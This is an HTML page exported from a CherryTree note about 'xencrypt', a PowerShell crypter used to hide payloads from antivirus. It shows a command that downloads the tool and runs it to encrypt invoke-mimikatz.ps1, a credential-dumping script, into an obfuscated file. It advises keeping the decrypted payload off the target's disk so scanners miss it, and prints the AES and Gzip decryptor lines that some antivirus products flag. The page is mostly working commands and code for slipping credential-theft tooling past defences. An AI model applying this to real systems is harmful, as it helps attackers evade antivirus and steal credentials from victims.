<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>xencrypt</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>xencrypt</h1><br/><strong>xencrypt</strong>(Github: <a href="https://github.com/the-xentropy/xencrypt">https://github.com/the-xentropy/xencrypt</a> , Site:<a href="https://netsec.expert/">https://netsec.expert/</a>)<br /><br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">New-Object</span> system.Net.WebClient).DownloadFile(<span style="color:#3ad900;font-weight:400">&quot;https://raw.githubusercontent.com/the-xentropy/xencrypt/master/xencrypt.ps1&quot;</span>,<span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\xencrypt.ps1&quot;</span>);<br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#00117f;font-weight:400">Invoke-Xencrypt</span> <span style="color:#ff9d00;font-weight:700">-</span>InFile C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>danie<span style="color:#ff9d00;font-weight:700">\</span>Desktop<span style="color:#ff9d00;font-weight:700">\</span><span style="color:#00117f;font-weight:400">invoke-mimikatz</span>.ps1 <span style="color:#ff9d00;font-weight:700">-</span>OutFile C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>danie<span style="color:#ff9d00;font-weight:700">\</span>Desktop<span style="color:#ff9d00;font-weight:700">\</span>xenmimi.ps1</pre></div><br />     Note:<br />   ◇ Your decrypted payload must never touch the disk of the target in an unencrypted state. If you save the decrypted payload to disk and execute it there, AV will simply scan the decrypted file and it’ll get picked up like the original input file would.<br />   ◇ Some AV(only two for now:Kaspersky and Checkpoint) will detect it as a “<span style="color:#3a4eff;">HEUR:Trojan.PowerShell.Crypt.gen</span>” because these lines are found in the file:<br />        <div class="codebox"><pre><span style="color:#3ad900;font-weight:400">&quot;-file&quot;</span> <span style="color:#3ad900;font-weight:400">&quot;C:\xenmimi.ps1&quot;</span><br /><span style="color:#0088ff;font-weight:400">$ikrfbtgzu</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">New-Object</span> <span style="color:#3ad900;font-weight:400">&quot;System.Security.Cryptography.AesManaged&quot;</span><br /><span style="color:#0088ff;font-weight:400">$ikrfbtgzu</span>.IV <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$eefc</span>[<span style="color:#333333;font-weight:400">0</span>..<span style="color:#333333;font-weight:400">15</span>]<br /><span style="color:#0088ff;font-weight:400">$ikrfbtgzu</span>.Key <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$mszuup</span><br /><span style="color:#0088ff;font-weight:400">$ikrfbtgzu</span>.KeySize <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">128</span><br /><span style="color:#0088ff;font-weight:400">$ikrfbtgzu</span>.Mode <span style="color:#ff9d00;font-weight:700">=</span> [System.Security.Cryptography.CipherMode]<span style="color:#ff9d00;font-weight:700">::</span>CBC<br /><span style="color:#0088ff;font-weight:400">$ikrfbtgzu</span>.Padding <span style="color:#ff9d00;font-weight:700">=</span> [System.Security.Cryptography.PaddingMode]<span style="color:#ff9d00;font-weight:700">::</span>ANSIX923<br /><span style="color:#0088ff;font-weight:400">$mszuup</span> <span style="color:#ff9d00;font-weight:700">=</span> [System.Convert]<span style="color:#ff9d00;font-weight:700">::</span>FromBase64String(<span style="color:#3ad900;font-weight:400">&quot;GzittGRPIJa/jQYBFDB4NeAbpKqqZPuo4t7nanlGBQg=&quot;</span>)<br /><span style="color:#0088ff;font-weight:400">$ocetrt</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">New-Object</span> System.IO.Compression.GzipStream <span style="color:#0088ff;font-weight:400">$yfkp</span>, ([IO.Compression.CompressionMode]<span style="color:#ff9d00;font-weight:700">::</span>Decompress)<br /><span style="color:#0088ff;font-weight:400">$oxqopx</span> <span style="color:#ff9d00;font-weight:700">=</span> [System.Text.Encoding]<span style="color:#ff9d00;font-weight:700">::</span>UTF8.GetString(<span style="color:#0088ff;font-weight:400">$hjcmkewaw</span>.ToArray())<br /><span style="color:#0088ff;font-weight:400">$yfkp</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">New-Object</span> System.IO.MemoryStream(,<span style="color:#0088ff;font-weight:400">$ikrfbtgzu</span>.CreateDecryptor().TransformFinalBlock(<span style="color:#0088ff;font-weight:400">$eefc</span>,<span style="color:#333333;font-weight:400">16</span>,<span style="color:#0088ff;font-weight:400">$eefc</span>.<span style="color:#00117f;font-weight:400">Length-16</span>))</pre></div><br />    <br />    <br />Bibliography:<br />• <a href="https://netsec.expert/posts/write-a-crypter-in-any-language/">https://netsec.expert/posts/write-a-crypter-in-any-language/</a><br />• <a href="https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf">https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf</a><br />• <a href="https://gist.github.com/ctigeek/2a56648b923d198a6e60">Aes Encryption using powershell. · GitHub</a></div>
</body>
</html>
